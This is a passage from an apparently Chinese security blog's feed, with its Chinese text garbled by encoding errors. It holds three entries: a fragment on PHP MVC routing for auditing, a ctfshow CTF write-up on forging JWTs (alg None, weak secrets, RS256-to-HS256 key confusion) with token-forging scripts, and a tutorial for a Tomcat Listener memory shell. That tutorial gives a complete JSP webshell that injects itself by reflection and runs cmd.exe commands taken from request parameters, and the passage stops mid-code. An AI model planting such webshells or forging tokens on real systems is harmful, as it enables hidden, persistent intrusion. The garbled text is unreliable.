    <content type="html"><![CDATA[<!-- ## MVCçš„ç®€å•ç†è§£åŸºæœ¬ä¸Šç½‘ä¸Šå¾ˆå¤šèµ„æ–™æ˜¯æœ‰å…³äºMVCï¼Œå’Œç±»ä¼¼è¿™å¼ å›¾çš„![](1.png)å…¶å®åœ¨phpä¸­ï¼Œæˆ‘å®¡è®¡è¿‡çš„ä¸€ä¸¤ä¸ªåŸºäºMVCæ¡†æ¶çš„phpcmsï¼ŒåŸºæœ¬ä¸Šå¯ä»¥é€šä¿—çš„ç†è§£ä¸º+ Modelï¼šä¸æ•°æ®åº“ç›¸å…³+ Controllerï¼š ä¸å¤„ç†ç›¸åº”çš„è¯·æ±‚æœ‰å…³ï¼Œä¹Ÿå°±æ˜¯ä¼šç‰µæ‰¯åˆ°è·¯ç”±+ Viewï¼šä¸htmlæœ‰å…³ï¼Œå°±æ˜¯æœ€åæ¸²æŸ“å‡ºæ¥çš„ç»“æœ## åˆ†æè·¯ç”±æ‹¿åˆ°ä¸€ä¸ªåŸºäºMVCæ¡†æ¶çš„phpcmsï¼Œé¦–å…ˆå°±æ˜¯è¦åˆ†æä»–çš„è·¯ç”±ï¼Œä¹Ÿå°±æ˜¯Controllerï¼Œä¸€èˆ¬URLé“¾æ¥éƒ½æ˜¯é•¿è¿™æ ·`index.php?c=Controller&a=Action&d=do`+ cä»£è¡¨æ–‡ä»¶å¤¹+ aä»£è¡¨æ–‡ä»¶ï¼Œ+ dä»£è¡¨æ–‡ä»¶ä¸­çš„å‡½æ•° -->]]></content>
    
    
      
      
    <summary type="html">&lt;!-- ## MVCçš„ç®€å•ç†è§£
åŸºæœ¬ä¸Šç½‘ä¸Šå¾ˆå¤šèµ„æ–™æ˜¯æœ‰å…³äºMVCï¼Œå’Œç±»ä¼¼è¿™å¼ å›¾çš„
![](1.png)
å…¶å®åœ¨phpä¸­ï¼Œæˆ‘å®¡è®¡è¿‡çš„ä¸€ä¸¤ä¸ªåŸºäºMVCæ¡†æ¶çš„phpcmsï¼ŒåŸºæœ¬ä¸Šå¯ä»¥é€šä¿—çš„ç†è§£ä¸º
+ Modelï¼šä¸æ•°æ®åº“ç›¸å…³
+ Controllerï¼š ä¸å¤„ç†ç›¸åº”çš„è¯·æ±‚æœ‰å…³ï¼Œä¹Ÿå°±æ˜¯ä¼š</summary>
      
    
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    
    <category term="ä»£ç å®¡è®¡" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="php" scheme="http://example.com/tags/php/"/>
    
    <category term="mvc" scheme="http://example.com/tags/mvc/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow-jwt</title>
    <link href="http://example.com/2022/12/05/ctfshow-jwt/"/>
    <id>http://example.com/2022/12/05/ctfshow-jwt/</id>
    <published>2022-12-04T21:02:51.000Z</published>
    <updated>2022-12-04T22:43:16.292Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬åŸç†"><a href="#åŸºæœ¬åŸç†" class="headerlink" title="åŸºæœ¬åŸç†"></a>åŸºæœ¬åŸç†</h2><p>jwtä¸€å…±æœ‰ä¸‰éƒ¨åˆ†</p><ul><li>header</li><li>payload</li><li>signature<span id="more"></span></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">header</span><br><span class="line">&#123;</span><br><span class="line">  &#x27;typ&#x27;: &#x27;JWT&#x27;,</span><br><span class="line">  &#x27;alg&#x27;: &#x27;HS256&#x27;  // åŠ å¯†ç®—æ³•</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">payload</span><br><span class="line">&#123;</span><br><span class="line">  &quot;sub&quot;: &quot;1234567890&quot;,</span><br><span class="line">  &quot;name&quot;: &quot;John Doe&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">signature</span><br><span class="line">ç”±å‰é¢ä¸¤éƒ¨åˆ†base64åŠ å¯†åç”¨.è¿æ¥å¹¶è¿›è¡Œheaderä¸­å£°æ˜çš„æ–¹å¼å»åŠ å¯†</span><br></pre></td></tr></table></figure><p>jwtå°±æ˜¯ä¸Šé¢ä¸‰ä¸ªé€šè¿‡.è¿›è¡Œè¿æ¥<br>jwtè§£å¯†ç½‘ç«™<br><a href="https://jwt.io/">https://jwt.io/</a></p><h2 id="web345"><a href="#web345" class="headerlink" title="web345"></a>web345</h2><p>é€šè¿‡base64è§£ç å¾—åˆ°çš„cookie<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0.W3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJ1c2VyIiwianRpIjoiOTVhZDIwMzA1NTY2NmE2ZDBhZjBiY2M2NDc5OTMwYmIifV0</code><br>å¾—åˆ°<br><code>&#123;&quot;alg&quot;:&quot;None&quot;,&quot;typ&quot;:&quot;jwt&quot;&#125;[&#123;&quot;iss&quot;:&quot;admin&quot;,&quot;iat&quot;:1670187851,&quot;exp&quot;:1670195051,&quot;nbf&quot;:1670187851,&quot;sub&quot;:&quot;user&quot;,&quot;jti&quot;:&quot;95ad203055666a6d0af0bcc6479930bb&quot;&#125;]</code><br>å°†useræ”¹æˆadminä»¥ååœ¨è¿›è¡ŒåŠ å¯†<br><code>eyJhbGciOiJOb25lIiwidHlwIjoiand0In0AW3siaXNzIjoiYWRtaW4iLCJpYXQiOjE2NzAxODc4NTEsImV4cCI6MTY3MDE5NTA1MSwibmJmIjoxNjcwMTg3ODUxLCJzdWIiOiJhZG1pbiIsImp0aSI6Ijk1YWQyMDMwNTU2NjZhNmQwYWYwYmNjNjQ3OTkzMGJiIn1d</code><br>å¹¶ç”¨æ­¤cookieå»è®¿é—®/adminï¼Œå°±è¡Œäº†</p><h2 id="web346"><a href="#web346" class="headerlink" title="web346"></a>web346</h2><p>é€šè¿‡ <a href="https://jwt.io/">https://jwt.io/</a> è¿›è¡Œè§£å¯†<br>ä¿®æ”¹ä¸ºadminåï¼ŒçŒœæµ‹å¯†é’¥æ˜¯123456ï¼Œå¹¶é‡æ–°åŠ å¯†<br><img src="/2022/12/05/ctfshow-jwt/1.jpg" alt></p><h2 id="web347"><a href="#web347" class="headerlink" title="web347"></a>web347</h2><p>ä¸web346ç›¸åŒï¼Œå¯†é’¥ä¹Ÿç›¸åŒ</p><h2 id="web348"><a href="#web348" class="headerlink" title="web348"></a>web348</h2><p>é€šè¿‡è„šæœ¬çˆ†ç ´<br><a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a></p><h2 id="we349"><a href="#we349" class="headerlink" title="we349"></a>we349</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public//private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//public/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert, <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>ç”±getçš„è·¯ç”±ï¼Œå¯ä»¥çŸ¥é“é€šè¿‡private.keyå¯¹jwtè¿›è¡ŒåŠ å¯†<br>æˆ‘ä»¬è®¿é—®/private.keyï¼Œæ‹¿åˆ°ç§é’¥<br>é€šè¿‡pythonè¿›è¡ŒåŠ å¯†<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># pip install pyjwt</span></span><br><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line">public = <span class="built_in">open</span>(<span class="string">&#x27;private.key&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">payload=&#123;<span class="string">&quot;user&quot;</span>:<span class="string">&quot;admin&quot;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(jwt.encode(payload, key=public, algorithm=<span class="string">&#x27;RS256&#x27;</span>))</span><br><span class="line"><span class="comment"># eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.NoE2xAUmDyHc0rhNtNtUn8URhEZeFGy9M0hd7hBEfRD3jpGqetn0nj2Tm9mob9LWyl2BazTLm_1Ez1vn0A6ZxgcpF73B6_rE4zrDvyu3b6eH3FtwmKd9I6N0KzkO1IpTggRVy6l4RoQCoG4JJ6X9YVJgOWtm0vgWzcjjXejlEsM</span></span><br></pre></td></tr></table></figure></p><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/private.key&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;user&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;RS256&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth&#x27;</span>,token);</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag?&#x27;</span>);</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>,<span class="keyword">function</span>(<span class="params">req,res,next</span>)&#123;</span><br><span class="line"><span class="keyword">var</span> flag=<span class="string">&quot;flag_here&quot;</span>;</span><br><span class="line">res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line"><span class="keyword">var</span> cert = fs.<span class="title function_">readFileSync</span>(process.<span class="title function_">cwd</span>()+<span class="string">&#x27;//routes/public.key&#x27;</span>);  <span class="comment">// get public key</span></span><br><span class="line">jwt.<span class="title function_">verify</span>(auth, cert,<span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">  <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;you are not admin&#x27;</span>+err);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåªèƒ½è·å–åˆ°public.keyï¼Œè¿™æ—¶å€™å¯ä»¥æ›´æ”¹RS256ä¸ºHS256ï¼Œåœ¨åç«¯è¿›è¡Œæ ¡éªŒçš„æ—¶å€™å°±ä¼šä½¿ç”¨HS256è¿›è¡ŒéªŒè¯ï¼Œä¸”æˆ‘ä»¬çŸ¥é“å¯†é’¥ä¸ºpublic.key<br>åˆ©ç”¨nodejsè¿›è¡ŒåŠ å¯†ï¼Œä¿è¯ç‰ˆæœ¬ç›¸åŒ<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> privateKey = fs.<span class="title function_">readFileSync</span>(<span class="string">&#x27;public.key&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123; <span class="attr">user</span>: <span class="string">&#x27;admin&#x27;</span> &#125;, privateKey, &#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(token)</span><br></pre></td></tr></table></figure></p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://blog.csdn.net/miuzzx/article/details/111936737">https://blog.csdn.net/miuzzx/article/details/111936737</a></li><li><a href="https://xz.aliyun.com/t/2338">https://xz.aliyun.com/t/2338</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;åŸºæœ¬åŸç†&quot;&gt;&lt;a href=&quot;#åŸºæœ¬åŸç†&quot; class=&quot;headerlink&quot; title=&quot;åŸºæœ¬åŸç†&quot;&gt;&lt;/a&gt;åŸºæœ¬åŸç†&lt;/h2&gt;&lt;p&gt;jwtä¸€å…±æœ‰ä¸‰éƒ¨åˆ†&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;header&lt;/li&gt;
&lt;li&gt;payload&lt;/li&gt;
&lt;li&gt;signature&lt;/li&gt;&lt;/ul&gt;</summary>
    
    
    
    <category term="ctf" scheme="http://example.com/categories/ctf/"/>
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
    <category term="jwt" scheme="http://example.com/tags/jwt/"/>
    
    <category term="ctfshow" scheme="http://example.com/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>Listenerå†…å­˜é©¬</title>
    <link href="http://example.com/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>http://example.com/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2022-12-04T20:17:43.000Z</published>
    <updated>2022-12-04T20:49:20.873Z</updated>
    
    <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>è®²è§£Listenerå†…å­˜é©¬åŸç†ï¼Œå’Œç®€å•å®ç°<br><span id="more"></span></p><h2 id="ListeneråŠ è½½åŸç†"><a href="#ListeneråŠ è½½åŸç†" class="headerlink" title="ListeneråŠ è½½åŸç†"></a>ListeneråŠ è½½åŸç†</h2><p><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/1.jpg" alt><br>è¿˜æ˜¯è¿™å¼ å›¾ï¼ŒListeneræ˜¯åœ¨æœ€å¼€å§‹å°±è¢«åˆ›å»ºçš„</p><p>Listenerä¸€å…±æœ‰8ä¸ªç›‘å¬å™¨æ¥å£ï¼Œä½†æ˜¯ç”±äºå†…å­˜é©¬çš„ç‰¹æ®Šæ€§ï¼Œä¸€èˆ¬æ˜¯åœ¨ServletRequestListeneræ¥å£è¿›è¡Œå†…å­˜é©¬æ³¨å…¥ï¼Œè¯¥æ¥å£ç”¨äºç›‘å¬ ServletRequest å¯¹è±¡çš„åˆ›å»ºå’Œé”€æ¯è¿‡ç¨‹ï¼Œè€Œæ¯æ¬¡è®¿é—®æœåŠ¡å™¨éƒ½ä¼šè§¦å‘æ­¤æ¥å£</p><h3 id="è°ƒè¯•"><a href="#è°ƒè¯•" class="headerlink" title="è°ƒè¯•"></a>è°ƒè¯•</h3><p>å‰æœŸå‡†å¤‡å¯ä»¥çœ‹çœ‹Filterå†…å­˜é©¬çš„æ–‡ç« </p><p>å…ˆå†™ä¸€ä¸ªListenerçš„å®¹å™¨ï¼Œå®ç°äº†ServletRequestListeneræ¥å£ï¼Œç”¨æ³¨è§£çš„æ–¹å¼è¿›è¡Œæ³¨å†Œ<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰§è¡Œäº†TestListener requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;æ‰§è¡Œäº†TestListener requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>åœ¨requestInitializedå¤„æ‰“ä¸Šæ–­ç‚¹ï¼Œæ ¹æ®è°ƒç”¨æ ˆï¼Œå¯ä»¥çŸ¥é“æ˜¯<code>context.fireRequestInitEvent(request.getRequest())</code>è¿›è¡Œäº†åˆå§‹åŒ–<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/2.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/3.jpg" alt></p><p>contextæ˜¯ç”±<code>request.getContext();</code>åˆå§‹åŒ–ï¼Œåœ¨åç»­åˆ©ç”¨éœ€è¦<br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/4.jpg" alt></p><p>è¿›å…¥<code>context.fireRequestInitEvent</code>å‡½æ•°ï¼Œå¯ä»¥çœ‹åˆ°æ˜¯ç”±listenerè¿›è¡Œäº†ç›‘å¬å™¨åˆå§‹åŒ–ï¼Œä¸”listeneræ¥æºäº<code>getApplicationEventListeners();</code><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/5.jpg" alt><br><img src="/2022/12/05/Listener%E5%86%85%E5%AD%98%E9%A9%AC/6.jpg" alt></p><h2 id="å†…å­˜é©¬å®ç°"><a href="#å†…å­˜é©¬å®ç°" class="headerlink" title="å†…å­˜é©¬å®ç°"></a>å†…å­˜é©¬å®ç°</h2><p>é€šè¿‡ä¸Šé¢çš„åˆ†æï¼Œæˆ‘ä»¬å¯ä»¥çŸ¥é“ï¼Œåªéœ€è¦å¾€applicationEventListenersListä¸­åŠ å…¥æˆ‘ä»¬çš„Listenerå¯¹è±¡å°±å¯ä»¥äº†<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.List&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MyListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmdl&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (IOException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (NoSuchFieldException e) &#123;&#125;</span><br><span class="line">                <span class="keyword">catch</span> (IllegalAccessException e) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">aELL</span> <span class="operator">=</span> context.getClass().getDeclaredField(<span class="string">&quot;applicationEventListenersList&quot;</span>);</span><br><span class="line">    aELL.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">List</span> <span class="variable">applicationEventListenersList</span> <span class="operator">=</span> (List)aELL.get(context);</span><br><span class="line">    <span class="type">MyListener</span> <span class="variable">listenerDemo</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">MyListener</span>();</span><br><span class="line">    applicationEventListenersList.add(listenerDemo);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><br>æ ¹æ®å‰é¢çš„åˆ†æï¼Œcontextæ˜¯ç”±<code>request.getContext();</code>å¾—åˆ°çš„ï¼Œæ‰€ä»¥å†™å†…å­˜é©¬çš„æ—¶å€™ä¹Ÿå¯ä»¥é€šè¿‡åŒæ ·çš„æ–¹å¼è·å–</p><p>å¢åŠ applicationEventListenersListï¼Œè¿™é‡Œæˆ‘æ˜¯é€šè¿‡åå°„çš„æ–¹å¼è·å–åˆ°äº†privateå±æ€§çš„applicationEventListenersListï¼Œç„¶åè¿›è¡Œäº†ä¸€æ¬¡add<br>å½“ç„¶ä¹Ÿå¯ä»¥é€šè¿‡contextæä¾›çš„æˆå‘˜æ–¹æ³•è¿›è¡Œä¿®æ”¹<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span 